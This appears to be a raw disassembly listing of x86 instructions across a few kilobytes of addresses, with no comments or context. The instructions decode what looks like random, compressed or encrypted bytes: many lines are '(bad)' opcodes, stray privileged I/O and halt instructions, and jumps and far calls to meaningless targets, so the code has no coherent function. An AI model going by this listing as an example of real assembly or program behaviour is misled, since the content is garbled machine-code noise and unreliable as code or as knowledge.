  414fe6:	mov    WORD PTR [edi+0x444df766],ss
  414fec:	jmp    0x415018
  414fee:	push   edx
  414fef:	mov    ah,0x8f
  414ff1:	adc    dl,dl
  414ff3:	fs inc edx
  414ff5:	xor    eax,0x64944b79
  414ffa:	aam    0x7b
  414ffc:	sub    ebp,DWORD PTR [ebp-0x6246e74d]
  415002:	sti    
  415003:	mov    ds:0x6562cc14,al
  415008:	push   eax
  415009:	fmul   DWORD PTR [ebx]
  41500b:	mov    ds:0x71fcc4d3,eax
  415010:	mov    edx,0x38d3e583
  415015:	call   0xc904:0xe9255998
  41501c:	mov    dh,0x5d
  41501e:	cmp    DWORD PTR [ecx],ebx
  415020:	mov    ecx,0xd564c9ed
  415025:	stc    
  415026:	cdq    
  415027:	je     0x414fc3
  415029:	out    0x52,al
  41502b:	sub    eax,0x96ccc81e
  415030:	(bad)  
  415031:	push   ebx
  415032:	and    DWORD PTR [ecx-0x2d],ecx
  415035:	ror    BYTE PTR [esi+0x1],cl
  415038:	(bad)  
  415039:	pop    esp
  41503a:	xchg   esp,eax
  41503b:	xchg   esi,eax
  41503c:	and    cl,dh
  41503e:	test   BYTE PTR ds:0x6af73443,ah
  415044:	xor    bh,dh
  415046:	or     al,0x16
  415048:	shr    ah,1
  41504a:	mov    edi,0x95c8ed77
  41504f:	or     DWORD PTR [ebx+edx*2],0xd63aa14f
  415056:	push   esi
  415057:	fsub   DWORD PTR [edx]
  415059:	and    ecx,DWORD PTR [ecx+0x36]
  41505c:	mov    esp,cs
  41505e:	mov    cl,0xc1
  415060:	fsubr  st,st(2)
  415062:	push   eax
  415063:	xchg   ebx,eax
  415064:	das    
  415065:	test   al,0x60
  415067:	push   0x66350b0b
  41506c:	sub    al,0x27
  41506e:	jnp    0x41506d
  415070:	push   es
  415071:	ins    DWORD PTR es:[edi],dx
  415072:	cmp    BYTE PTR [edi+0x6d],bh
  415075:	pop    ebp
  415076:	imul   esp,eax,0x41913a30
  41507c:	ret    
  41507d:	pop    ds
  41507e:	sub    al,0xc7
  415080:	mov    DWORD PTR ds:0x25822651,ebp
  415086:	xchg   esp,eax
  415087:	mov    al,0xd6
  415089:	add    BYTE PTR [esi+0x64],ch
  41508c:	or     eax,ebp
  41508e:	ret    0xda86
  415091:	fndisi(8087 only) 
  415093:	xchg   edi,eax
  415094:	xchg   BYTE PTR [edi],dl
  415096:	dec    ebx
  415097:	inc    ecx
  415098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415099:	enter  0xb4f5,0x23
  41509d:	adc    ax,0xc222
  4150a1:	iret   
  4150a2:	and    ah,0x87
  4150a5:	xchg   edi,eax
  4150a6:	mov    eax,ds:0x6cb052ba
  4150ab:	fstp   st(3)
  4150ad:	fisttp DWORD PTR [edi]
  4150af:	push   ebx
  4150b0:	into   
  4150b1:	out    dx,eax
  4150b2:	repnz out dx,al
  4150b4:	fs in  al,dx
  4150b6:	add    edi,DWORD PTR [ecx-0x7]
  4150b9:	in     eax,dx
  4150ba:	jl     0x4150e7
  4150bc:	cli    
  4150bd:	inc    esp
  4150be:	jg     0x415139
  4150c0:	pop    ebp
  4150c1:	pop    ss
  4150c2:	lock inc edx
  4150c4:	call   0x863f:0x525da17c
  4150cb:	rcr    DWORD PTR [ebx+0x5a],cl
  4150ce:	(bad)
  4150d2:	push   ebx
  4150d3:	cmp    eax,0xf77f041a
  4150d8:	inc    BYTE PTR [bx+si-0x3182]
  4150dd:	push   esi
  4150de:	hlt    
  4150df:	outs   dx,DWORD PTR ds:[esi]
  4150e0:	sar    dh,1
  4150e2:	push   esi
  4150e3:	outs   dx,DWORD PTR ds:[esi]
  4150e4:	fist   DWORD PTR [ecx-0x19]
  4150e7:	mov    ebx,DWORD PTR gs:[ebp+0x2c92e095]
  4150ee:	pop    edx
  4150ef:	je     0x415093
  4150f1:	mov    al,0x3d
  4150f3:	ja     0x4150f6
  4150f5:	call   0x46cc325e
  4150fa:	sub    ah,BYTE PTR [edx+esi*1-0x4eede1d4]
  415101:	je     0x4150a9
  415103:	out    dx,al
  415104:	ficom  DWORD PTR [ecx+0x3033e09b]
  41510a:	mov    al,0xbb
  41510c:	pop    eax
  41510d:	daa    
  41510e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41510f:	xchg   edi,eax
  415110:	jp     0x4150d7
  415112:	push   ecx
  415113:	sbb    bh,dl
  415115:	xchg   BYTE PTR [ebp-0x2],dh
  415118:	das    
  415119:	mov    eax,0xcc0d25cd
  41511e:	jp     0x41515d
  415120:	push   esi
  415121:	aaa    
  415122:	dec    ebp
  415123:	fwait
  415124:	out    dx,eax
  415125:	or     BYTE PTR [edi],0xf8
  415128:	scas   eax,DWORD PTR es:[edi]
  415129:	mov    ecx,0xcfbfcd09
  41512e:	sbb    al,0x9c
  415130:	xor    ebx,edi
  415132:	dec    esp
  415133:	mov    ebx,0x8138ca49
  415138:	adc    bl,BYTE PTR [ecx]
  41513a:	mov    ebp,0xc9ae94de
  41513f:	and    DWORD PTR [ebx-0x30],edi
  415142:	pop    ss
  415143:	scas   eax,DWORD PTR es:[edi]
  415144:	js     0x415124
  415146:	shl    DWORD PTR [esi],cl
  415148:	xor    eax,0xc7ee6a83
  41514d:	mov    DWORD PTR [eax+eax*4],eax
  415150:	(bad)
  415153:	push   0xffffffcc
  415155:	xor    al,0xbd
  415157:	pop    eax
  415158:	xchg   edx,eax
  415159:	scas   eax,DWORD PTR es:[edi]
  41515a:	add    DWORD PTR [bp+di],edi
  41515d:	jle    0x41516c
  41515f:	pop    esp
  415160:	cdq    
  415161:	or     dh,BYTE PTR [edi-0x46]
  415164:	jo     0x4151c9
  415166:	pop    esp
  415167:	ss dec ecx
  415169:	or     al,0xe8
  41516b:	fist   DWORD PTR [ebp-0x80]
  41516e:	jl     0x4151c3
  415170:	outs   dx,DWORD PTR ds:[esi]
  415171:	ds push edi
  415173:	div    BYTE PTR [ecx-0x708e0e00]
  415179:	jo     0x41519e
  41517b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41517c:	sbb    eax,0x8f4a7815
  415181:	addr16 pop ebp
  415183:	adc    ah,BYTE PTR [ecx-0x19d048a0]
  415189:	adc    DWORD PTR [edi-0x54200ec3],ebx
  41518f:	(bad)  [esi+0x7831e1df]
  415195:	sub    bl,BYTE PTR [ecx+0x59]
  415198:	fwait
  415199:	mov    ecx,0x54b880f7
  41519e:	fmul   st,st(0)
  4151a0:	aam    0x0
  4151a2:	into   
  4151a3:	push   ds
  4151a4:	std    
  4151a5:	pop    ss
  4151a6:	(bad)  
  4151a7:	cwde   
  4151a8:	cmp    ax,0x8faf
  4151ac:	pop    ss
  4151ad:	cmp    DWORD PTR [ecx],0x35
  4151b0:	add    BYTE PTR [esi+0x21],0x53
  4151b4:	or     BYTE PTR [ecx],ch
  4151b6:	ret    
  4151b7:	sub    ah,BYTE PTR [edx-0x6b1c9faf]
  4151bd:	adc    eax,DWORD PTR [edi]
  4151bf:	dec    edi
  4151c0:	mov    al,ds:0x7126b1bc
  4151c5:	push   es
  4151c6:	jb     0x415174
  4151c8:	jge    0x415156
  4151ca:	add    al,0x59
  4151cc:	add    al,0xbd
  4151ce:	mov    eax,ds:0xe8a58fc9
  4151d3:	aas    
  4151d4:	(bad)
  4151d7:	js     0x41519b
  4151d9:	lahf   
  4151da:	xchg   ecx,eax
  4151db:	data16 rol BYTE PTR [ebx+ebx*4+0x34],0x41
  4151e1:	mov    bh,0x38
  4151e3:	sbb    al,0x83
  4151e5:	test   DWORD PTR [eax],esi
  4151e7:	pcmpgtd mm4,QWORD PTR [di-0x41]
  4151ec:	mov    DWORD PTR [esi-0x25],edi
  4151ef:	sub    al,0xaf
  4151f1:	rol    BYTE PTR [esi],cl
  4151f3:	jge    0x41524a
  4151f5:	jge    0x41519e
  4151f7:	dec    edx
  4151f8:	not    BYTE PTR [edx]
  4151fa:	fdiv   DWORD PTR [edx-0x1d]
  4151fd:	pop    edi
  4151fe:	xor    al,0xe1
  415200:	mov    ecx,0x915e5cb5
  415205:	sub    eax,0x6a2bd4db
  41520a:	adc    BYTE PTR [ebx],dl
  41520c:	mov    eax,0x520ea600
  415211:	test   eax,0x31c8f890
  415216:	clc    
  415217:	into   
  415218:	mov    ds:0x6c3402b0,al
  41521d:	jns    0x415288
  41521f:	mov    esp,0xa0be659a
  415224:	mov    fs,WORD PTR [edi]
  415226:	imul   esp,DWORD PTR [edx],0x8bd8f8e3
  41522c:	and    eax,0x306dedbd
  415231:	push   edx
  415232:	mov    esp,0x6e19c9b4
  415237:	and    eax,0xa8a1283a
  41523c:	mov    al,ds:0x2d9f827d
  415241:	out    dx,al
  415242:	mov    al,0xfa
  415244:	das    
  415245:	jg     0x415261
  415247:	test   eax,0x804499be
  41524c:	(bad)  
  41524f:	outs   dx,BYTE PTR ds:[esi]
  415250:	dec    DWORD PTR [ecx-0x71386f5b]
  415256:	mov    dl,0xea
  415258:	add    eax,0x37d5f321
  41525d:	pushf  
  41525e:	lock adc DWORD PTR ds:0x7e3684b,edi
  415265:	das    
  415266:	lock sub BYTE PTR [edi+0x393ac417],bl
  41526d:	mov    ?,WORD PTR [ecx+0x21]
  415270:	dec    esi
  415271:	add    DWORD PTR [edi],ecx
  415273:	mov    ah,BYTE PTR [edx-0x286b6a36]
  415279:	mov    DWORD PTR [edx-0x57eb86bf],ebx
  41527f:	sub    dh,BYTE PTR [ebx+0xb888585]
  415285:	pop    ecx
  415286:	pop    ebp
  415287:	outs   dx,DWORD PTR ds:[esi]
  415288:	mov    fs,WORD PTR cs:[eax]
  41528b:	mov    ah,0x25
  41528d:	cmp    eax,0xd8653c9
  415292:	(bad)  
  415293:	adc    ch,BYTE PTR [esi+0x1ecd8ea5]
  415299:	cdq    
  41529a:	loopne 0x415292
  41529c:	sbb    DWORD PTR [edi],ebp
  41529e:	jl     0x4152e7
  4152a0:	push   ebp
  4152a1:	push   ecx
  4152a2:	es dec edi
  4152a4:	push   esi
  4152a5:	ret    0x14ec
  4152a8:	retf   0x250c
  4152ab:	loopne 0x415263
  4152ad:	mov    WORD PTR [edx-0x4e],cs
  4152b0:	jb     0x41532a
  4152b2:	push   cs
  4152b3:	nop
  4152b4:	cmp    eax,0x9c2ba203
  4152b9:	pop    ecx
  4152ba:	pop    ss
  4152bb:	add    BYTE PTR [eax+0x1b3dcf44],cl
  4152c1:	jp     0x415337
  4152c3:	mov    al,BYTE PTR [eax]
  4152c5:	mov    eax,0x81e163a5
  4152ca:	in     al,dx
  4152cb:	and    bh,BYTE PTR [eax-0x1683e01d]
  4152d1:	scas   eax,DWORD PTR es:[edi]
  4152d2:	(bad)  
  4152d3:	ror    BYTE PTR [eax+0x2e],cl
  4152d6:	add    esi,DWORD PTR [ecx+0x4cfd57d]
  4152dc:	retf   0xe6d3
  4152df:	xor    al,0x7d
  4152e1:	or     eax,0x3a8061d
  4152e6:	or     dh,BYTE PTR [edx-0x2f41cd9a]
  4152ec:	popa   
  4152ed:	(bad)  
  4152ee:	mov    bl,0x5a
  4152f0:	pusha  
  4152f1:	push   es
  4152f2:	cmc    
  4152f3:	dec    ecx
  4152f4:	(bad)  
  4152f5:	leave  
  4152f6:	inc    edi
  4152f7:	dec    ebp
  4152f8:	das    
  4152f9:	xor    BYTE PTR [eax+0x39b59c69],dl
  4152ff:	outs   dx,DWORD PTR ds:[esi]
  415300:	(bad)  
  415301:	jnp    0x415359
  415303:	lods   eax,DWORD PTR ds:[esi]
  415304:	mov    al,bh
  415306:	jle    0x415300
  415308:	in     eax,dx
  415309:	mov    ebx,0x4646fcf2
  41530e:	lds    ecx,FWORD PTR [ecx]
  415310:	mov    cl,0xf4
  415312:	call   0x31393b2b
  415317:	sub    eax,0xa19d55a5
  41531c:	inc    eax
  41531d:	mov    ah,BYTE PTR [ebx-0x2d]
  415320:	ds (bad) 
  415322:	jg     0x4152a4
  415324:	mov    bh,BYTE PTR [edx]
  415326:	inc    ebp
  415327:	xchg   ecx,eax
  415328:	test   DWORD PTR [esi],edx
  41532a:	es pop esi
  41532c:	pop    eax
  41532d:	pushw  0xefb8
  415331:	and    al,0x47
  415333:	outs   dx,DWORD PTR ds:[esi]
  415334:	xchg   ecx,eax
  415335:	xchg   esi,eax
  415336:	inc    edx
  415337:	into   
  415338:	xor    esi,DWORD PTR [esi]
  41533a:	shr    DWORD PTR [ebx+0x198c3656],cl
  415340:	mov    eax,ds:0xdf1c049e
  415345:	sub    BYTE PTR [esi-0x1a],ah
  415348:	adc    BYTE PTR [ebp-0xace243a],bh
  41534e:	mov    dh,0xe9
  415350:	pop    ds
  415351:	std    
  415352:	or     al,0xf4
  415354:	add    eax,0xf68bad0a
  415359:	sbb    ah,bh
  41535b:	test   eax,0xa8d8c997
  415360:	mov    eax,ds:0x7e3609b4
  415365:	or     eax,0x78f20ad1
  41536a:	fisttp DWORD PTR [edx-0x186376ad]
  415370:	mov    esp,0x3b302329
  415375:	fwait
  415376:	xchg   esp,eax
  415377:	and    BYTE PTR [ebx-0x29f37b99],ch
  41537d:	std    
  41537e:	mov    eax,ds:0x22363179
  415383:	(bad)  
  415384:	push   ebp
  415385:	push   ss
  415386:	loopne 0x415352
  415388:	shr    BYTE PTR [esi-0x2b],0xf5
  41538c:	pop    edi
  41538d:	dec    edx
  41538e:	push   ds
  41538f:	mov    esi,0xbc4084c1
  415394:	lods   eax,DWORD PTR ds:[esi]
  415395:	jge    0x4153b6
  415397:	scas   al,BYTE PTR es:[edi]
  415398:	shl    BYTE PTR [edi+0x5b],1
  41539b:	fiadd  WORD PTR [ecx+0x4d25b66d]
  4153a1:	icebp  
  4153a2:	retf   
  4153a3:	fmul   QWORD PTR [ebx+0x16]
  4153a6:	xor    al,0x1b
  4153a8:	and    ecx,DWORD PTR [esi-0x60c4365f]
  4153ae:	mov    eax,ss
  4153b0:	sbb    al,0xd9
  4153b2:	sahf   
  4153b3:	imul   esi,ecx,0x4edf58fa
  4153b9:	jmp    0x2e282faa
  4153be:	stc    
  4153bf:	sub    edi,DWORD PTR [ecx+0x49]
  4153c2:	int    0x44
  4153c4:	sub    BYTE PTR [edi+0x72],al
  4153c7:	pop    edi
  4153c8:	pusha  
  4153c9:	leave  
  4153ca:	aam    0x41
  4153cc:	inc    ebp
  4153cd:	adc    BYTE PTR [edx+0x1779534b],ch
  4153d3:	push   esp
  4153d4:	inc    esp
  4153d5:	mov    BYTE PTR [ecx-0x1a],bl
  4153d8:	shl    DWORD PTR [eax+0x61],0x26
  4153dc:	fdivr  QWORD PTR [eax-0x7]
  4153df:	sbb    DWORD PTR [edx+0x68],0x1e31a5e9
  4153e6:	js     0x4153a2
  4153e8:	repz mov bh,0x38
  4153eb:	enter  0xc5b5,0xd6
  4153ef:	loop   0x415459
  4153f1:	mov    ebp,0xd3abb09e
  4153f6:	dec    edi
  4153f7:	popa   
  4153f8:	sbb    ah,BYTE PTR [eax]
  4153fa:	(bad)  [ebp+0x6a6d7ecd]
  415400:	add    eax,0x16f1b24e
  415405:	sub    al,0x2b
  415407:	repz or dl,BYTE PTR [edi]
  41540a:	lods   eax,DWORD PTR ds:[esi]
  41540b:	js     0x415444
  41540d:	ins    DWORD PTR es:[edi],dx
  41540e:	jnp    0x415467
  415410:	jl     0x41539e
  415412:	pop    es
  415413:	jb     0x415477
  415415:	mov    edx,0xf11fea03
  41541a:	push   esp
  41541b:	add    edi,DWORD PTR [esi+0x6d]
  41541e:	(bad)  
  41541f:	fst    DWORD PTR ds:0x59180ba5
  415425:	sbb    dl,BYTE PTR [ebp+0x33fd7bb5]
  41542b:	push   ecx
  41542c:	pop    es
  41542d:	mov    DWORD PTR [esi-0x756a4e3d],esp
  415433:	ins    DWORD PTR es:[edi],dx
  415434:	enter  0x3b6f,0xad
  415438:	xchg   esp,eax
  415439:	cmp    BYTE PTR [esi+eiz*2+0x4135d9c2],cl
  415440:	cs sbb al,0xea
  415443:	xor    esp,DWORD PTR [edx+esi*4-0x2a]
  415447:	jne    0x415456
  415449:	adc    eax,0x4fcd895e
  41544e:	es out 0x50,eax
  415451:	mov    bl,0x24
  415453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415454:	inc    ecx
  415455:	enter  0x1281,0x98
  415459:	ret    
  41545a:	mov    ds:0x3d1c0e53,eax
  41545f:	(bad)
  415462:	sbb    eax,DWORD PTR [edi-0x1fe41ccd]
  415468:	jp     0x4154db
  41546a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41546b:	mov    eax,0x849f13a
  415470:	test   al,bh
  415472:	sbb    DWORD PTR [ebx],0xffffffe7
  415475:	xor    DWORD PTR [edi+0xc],eax
  415478:	inc    ebx
  415479:	aad    0x5c
  41547b:	xor    eax,0x115b0aa9
  415480:	mov    edx,0xcb6d9760
  415485:	jbe    0x415425
  415487:	fdiv   DWORD PTR [edi+0x1a]
  41548a:	int3   
  41548b:	dec    edi
  41548c:	aaa    
  41548d:	stos   BYTE PTR es:[edi],al
  41548e:	ins    DWORD PTR es:[edi],dx
  41548f:	pop    es
  415490:	out    dx,eax
  415491:	sub    DWORD PTR [eax-0x61],0x5e
  415495:	stc    
  415496:	out    0x53,eax
  415498:	test   BYTE PTR [ebx],0x8d
  41549b:	mov    ss:0x7982d033,eax
  4154a1:	inc    ebp
  4154a2:	pop    es
  4154a3:	fist   WORD PTR ds:0xe65601cd
  4154a9:	in     eax,0x92
  4154ab:	mov    eax,ebp
  4154ad:	js     0x415463
  4154af:	push   0xee17c210
  4154b4:	dec    ebp
  4154b5:	mov    ebp,0x5c4ed8a6
  4154ba:	sar    DWORD PTR [eax-0x1d],1
  4154bd:	add    BYTE PTR [esp+edi*4-0x63],bh
  4154c1:	cs pop ecx
  4154c3:	inc    edx
  4154c4:	and    eax,0xee0922ac
  4154c9:	pusha  
  4154ca:	js     0x4154a0
  4154cc:	jno    0x415467
  4154ce:	mov    al,ds:0x5f4ab485
  4154d3:	mov    edx,0x2feb1551
  4154d8:	popa   
  4154d9:	fcom   QWORD PTR [ecx-0x31]
  4154dc:	daa    
  4154dd:	repnz icebp 
  4154df:	mov    edi,0x3d57a951
  4154e4:	dec    edx
  4154e5:	adc    ch,0x61
  4154e8:	mov    fs,ecx
  4154ea:	out    0xc0,eax
  4154ec:	das    
  4154ed:	mov    ebx,ebp
  4154ef:	repz xchg ebx,eax
  4154f1:	cmp    ch,BYTE PTR [esi]
  4154f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154f4:	pop    ds
  4154f5:	ins    DWORD PTR es:[edi],dx
  4154f6:	stc    
  4154f7:	in     al,dx
  4154f8:	rcl    dl,0x3a
  4154fb:	(bad)  
  4154fc:	test   al,0x4c
  4154fe:	fbstp  TBYTE PTR [esi+eiz*1]
  415501:	adc    DWORD PTR [edx],esi
  415503:	out    dx,al
  415504:	shl    DWORD PTR [ebp+0x34],cl
  415507:	inc    esp
  415508:	push   0x84bccd04
  41550d:	xchg   BYTE PTR [edx-0x22],bl
  415510:	mov    edx,0xbf80aaaa
  415515:	enter  0x89e8,0xcd
  415519:	outs   dx,DWORD PTR ds:[esi]
  41551a:	mov    bh,cl
  41551c:	dec    eax
  41551d:	mov    edi,0x6fda1f81
  415522:	xor    BYTE PTR [eax+0xf],0x64
  415526:	and    BYTE PTR [ebx+0x59ce4271],dh
  41552c:	push   edx
  41552d:	stc    
  41552e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41552f:	out    0xbe,al
  415531:	(bad)  
  415532:	fild   QWORD PTR [ebx-0x1d6b96f9]
  415538:	push   ds
  415539:	xor    eax,0x77a5934a
  41553e:	mov    bh,0xa7
  415540:	out    0xae,al
  415542:	inc    esi
  415543:	test   cl,ch
  415545:	call   0x51873d2
  41554a:	push   esi
  41554b:	sbb    eax,0x8ac7fd31
  415550:	inc    ecx
  415551:	dec    esi
  415552:	push   ss
  415553:	add    DWORD PTR [ecx+0x35094de0],esi
  415559:	sub    eax,0x1b3782b5
  41555e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41555f:	cld    
  415560:	mov    edi,0xfa1a5b4b
  415565:	popa   
  415566:	mov    cl,0x4f
  415568:	sub    ecx,DWORD PTR [ebp+ebp*4-0x2d05b86a]
  41556f:	in     eax,0xf5
  415571:	mov    bh,0x96
  415573:	in     eax,dx
  415574:	leave  
  415575:	or     DWORD PTR [ecx+0xa61a30c],edi
  41557b:	(bad)  
  41557c:	mov    edi,0x6aa9929
  415581:	arpl   WORD PTR [ebx-0x6e],bx
  415584:	pop    di
  415586:	mov    edi,0x8b12e642
  41558c:	inc    ecx
  41558d:	lods   eax,DWORD PTR ds:[esi]
  41558e:	push   eax
  41558f:	inc    edx
  415590:	adc    al,0x39
  415592:	xor    BYTE PTR [ebx+0xb59ac9f],0x9a
  415599:	icebp  
  41559a:	add    al,0xd1
  41559c:	push   ds
  41559d:	scas   eax,DWORD PTR es:[edi]
  41559e:	push   esp
  41559f:	shl    DWORD PTR [ecx],0x9b
  4155a2:	jecxz  0x4155ac
  4155a4:	iret   
  4155a5:	pusha  
  4155a6:	punpckhbw mm5,QWORD PTR [ecx+0x57]
  4155aa:	pop    edx
  4155ab:	mov    ebp,0xd095b50
  4155b0:	cmp    BYTE PTR [ecx],cl
  4155b2:	clc    
  4155b3:	mov    bl,0xc
  4155b5:	xchg   esi,eax
  4155b6:	fild   WORD PTR [edi-0x27493b2d]
  4155bc:	shl    eax,cl
  4155be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155bf:	mov    dh,0x6f
  4155c1:	add    DWORD PTR [edi],esi
  4155c3:	cmp    al,0x61
  4155c5:	add    DWORD PTR [eax+0x7d1cc5c1],ecx
  4155cb:	mov    bh,0xb1
  4155cd:	add    DWORD PTR [edi],edi
  4155cf:	sbb    al,0xdc
  4155d1:	scas   eax,DWORD PTR es:[edi]
  4155d2:	loope  0x41555a
  4155d4:	retf   0x4eca
  4155d7:	mov    ebx,0x8e2d27b1
  4155dc:	sbb    al,0x6
  4155de:	pop    eax
  4155df:	add    DWORD PTR [ebx+0x26fe5563],esi
  4155e5:	pushf  
  4155e6:	clc    
  4155e7:	sbb    eax,0xf94c540d
  4155ec:	or     BYTE PTR [edx+ebp*1],ch
  4155ef:	xchg   esp,eax
  4155f0:	sub    al,BYTE PTR [ecx-0x6]
  4155f3:	int    0x24
  4155f5:	pop    esp
  4155f6:	inc    edx
  4155f7:	outs   dx,DWORD PTR ds:[esi]
  4155f8:	xchg   ecx,eax
  4155f9:	nop
  4155fa:	jmp    0x7944d8c5
  4155ff:	int3   
  415600:	or     DWORD PTR [ebx+0x56399103],0x263749ee
  41560a:	int    0x89
  41560c:	test   ebp,eax
  41560e:	mov    ds:0x6d8c9370,al
  415613:	or     ebx,esi
  415615:	xchg   ebx,eax
  415616:	adc    BYTE PTR [ecx],0x8a
  415619:	push   ds
  41561a:	jl     0x415688
  41561c:	test   eax,0x727fa6ef
  415621:	mov    WORD PTR [edx+eiz*8+0x6e094601],?
  415628:	fistp  WORD PTR [esi-0xa]
  41562b:	jae    0x4155b0
  41562d:	fbstp  TBYTE PTR [esi]
  41562f:	repnz (bad) 
  415631:	mov    ds:0x5de25f91,eax
  415636:	enter  0xc7bb,0x63
  41563a:	icebp  
  41563b:	retf   0xc3c3
  41563e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41563f:	and    al,0x53
  415641:	mov    cl,0x70
  415643:	repz jge 0x41566b
  415646:	jmp    0x415636
  415648:	inc    esp
  415649:	and    al,0xfd
  41564b:	push   cs
  41564c:	into   
  41564d:	and    al,0xbb
  41564f:	lea    esi,[ebx+esi*2+0xbb4be8]
  415656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415657:	(bad)  
  415658:	mov    ah,0xf5
  41565a:	mov    ds:0x3f63b176,al
  41565f:	jbe    0x415637
  415661:	jmp    0x7439:0xfa13ec49
  415668:	loop   0x415679
  41566a:	push   0x87d1a52f
  41566f:	dec    eax
  415670:	mov    ds:0xd72836a4,eax
  415675:	push   edx
  415676:	ss in  eax,dx
  415678:	push   esi
  415679:	xlat   BYTE PTR ds:[ebx]
  41567a:	mov    ds,WORD PTR [ecx-0x6c51f3ae]
  415680:	ficomp DWORD PTR [ecx]
  415682:	shl    BYTE PTR [ecx],1
  415684:	jp     0x4156fb
  415686:	mov    dl,0x75
  415688:	mov    bl,BYTE PTR [esi+0xa]
  41568b:	xchg   ecx,eax
  41568c:	daa    
  41568d:	push   ecx
  41568e:	mov    ebx,0x21a27909
  415693:	jno    0x4156b8
  415695:	dec    ecx
  415696:	fist   WORD PTR [ecx-0x62ab3396]
  41569c:	fwait
  41569d:	add    esp,DWORD PTR [edi-0x216d7a13]
  4156a3:	stos   DWORD PTR es:[edi],eax
  4156a4:	mov    dl,0xba
  4156a6:	ja     0x4156fa
  4156a8:	add    BYTE PTR [esi+0x71],ah
  4156ab:	shl    DWORD PTR [esi+ecx*4-0x570dc52c],cl
  4156b2:	(bad)  
  4156b3:	ins    DWORD PTR es:[edi],dx
  4156b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156b5:	fisubr WORD PTR [edi+0x1b]
  4156b8:	push   ebx
  4156b9:	xor    ebx,DWORD PTR ds:0x64e1eecd
  4156bf:	dec    ecx
  4156c0:	dec    ebx
  4156c1:	lock imul edi,DWORD PTR [ecx],0xffffffcc
  4156c5:	dec    edi
  4156c6:	add    al,0x2e
  4156c8:	adc    al,0xd7
  4156ca:	pusha  
  4156cb:	pop    ebx
  4156cc:	mov    eax,ds:0xa16ef94a
  4156d1:	pop    ss
  4156d2:	dec    ebp
  4156d3:	scas   al,BYTE PTR es:[edi]
  4156d4:	out    0x48,eax
  4156d6:	mov    esp,0xfe1f7ae4
  4156db:	push   ds
  4156dc:	(bad)  
  4156dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156df:	sbb    al,0xb8
  4156e1:	adc    BYTE PTR [edx-0x34],ah
  4156e4:	xchg   ebp,eax
  4156e5:	icebp  
  4156e6:	jl     0x415692
  4156e8:	xor    bh,BYTE PTR [ecx+0x63c985b1]
  4156ee:	xchg   ah,dl
  4156f0:	rcr    DWORD PTR [edx+0x29],cl
  4156f3:	add    edi,ebp
  4156f5:	test   eax,0xf1d1899c
  4156fa:	mov    ebp,0x15d1585b
  4156ff:	std    
  415700:	dec    eax
  415701:	sbb    al,0x47
  415703:	dec    eax
  415704:	ror    DWORD PTR ss:[ebx+0x51],1
  415708:	inc    ebp
  415709:	xor    al,0x22
  41570b:	mov    ebx,0xe3d227c1
  415710:	dec    edx
  415711:	mov    bh,0x8c
  415713:	inc    ecx
  415714:	outs   dx,BYTE PTR ds:[esi]
  415715:	and    ah,dh
  415717:	sbb    BYTE PTR [ebx+0x61],dl
  41571a:	or     BYTE PTR [edx-0x65],bh
  41571d:	jnp    0x415737
  41571f:	call   0xcf1c:0xc1c5c91d
  415726:	das    
  415727:	add    DWORD PTR [ebp-0x66926303],0xdb7a155b
  415731:	cld    
  415732:	shl    BYTE PTR [ecx+0x2b9ab75],cl
  415738:	sahf   
  415739:	inc    ebp
  41573a:	xor    BYTE PTR [esi+0x2c],cl
  41573d:	sahf   
  41573e:	xchg   esp,eax
  41573f:	enter  0xe4b8,0x83
  415743:	popa   
  415744:	inc    eax
  415745:	(bad)  
  415746:	neg    DWORD PTR [eax-0x4d1b74bb]
  41574c:	inc    ebp
  41574d:	jl     0x415752
  41574f:	jo     0x4157c8
  415751:	push   edi
  415752:	xchg   edi,eax
  415753:	cli    
  415754:	shr    BYTE PTR [eax-0x6],0x0
  415758:	pop    ebx
  415759:	loopne 0x415782
  41575b:	jle    0x41570d
  41575d:	leave  
  41575e:	aad    0x73
  415760:	and    al,0x1e
  415762:	push   esi
  415763:	nop
  415764:	push   ebp
  415765:	(bad)  
  415766:	arpl   WORD PTR [ecx],di
  415768:	test   DWORD PTR [ecx-0x80],esp
  41576b:	data16 test BYTE PTR [ecx],bl
  41576e:	sar    ebp,0x17
  415771:	push   0xb12bfde5
  415776:	stos   DWORD PTR es:[edi],eax
  415777:	mov    DWORD PTR [ebp+0xa9fe395],eax
  41577d:	jmp    0x2f481ed8
  415782:	pop    edi
  415783:	clc    
  415784:	or     ecx,DWORD PTR [ebx+ecx*4-0x3d]
  415788:	pop    ss
  415789:	sub    al,0x97
  41578b:	xchg   DWORD PTR [ebx-0x2],edx
  41578e:	icebp  
  41578f:	retf   0xc187
  415792:	sbb    DWORD PTR [ecx],edx
  415794:	xlat   BYTE PTR ds:[ebx]
  415795:	aam    0xd
  415797:	adc    BYTE PTR [esp+ecx*8+0x9],bh
  41579b:	dec    eax
  41579c:	adc    bl,BYTE PTR [eax-0x5a]
  41579f:	push   0xde4d9d25
  4157a4:	jne    0x415744
  4157a6:	sbb    BYTE PTR [edx-0x54],bh
  4157a9:	ja     0x415820
  4157ab:	fisttp QWORD PTR [eax+0x6630ce66]
  4157b1:	xchg   edx,eax
  4157b2:	lods   eax,DWORD PTR ds:[esi]
  4157b3:	test   DWORD PTR [ebx],ecx
  4157b5:	dec    ecx
  4157b6:	aas    
  4157b7:	aaa    
  4157b8:	das    
  4157b9:	ficom  WORD PTR [ebx-0x1d]
  4157bc:	jmp    0xa70b:0xe7ef2932
  4157c3:	pop    ecx
  4157c4:	mov    ds:0x46cca29d,al
  4157c9:	adc    al,0xb8
  4157cb:	mov    ebx,0x7336dbe8
  4157d0:	mov    esp,DWORD PTR [ebp+0x76]
  4157d3:	fadd   DWORD PTR [eax-0x68]
  4157d6:	jbe    0x415835
  4157d8:	(bad)  [eax]
  4157da:	mov    bh,BYTE PTR [ecx-0x6f9aef42]
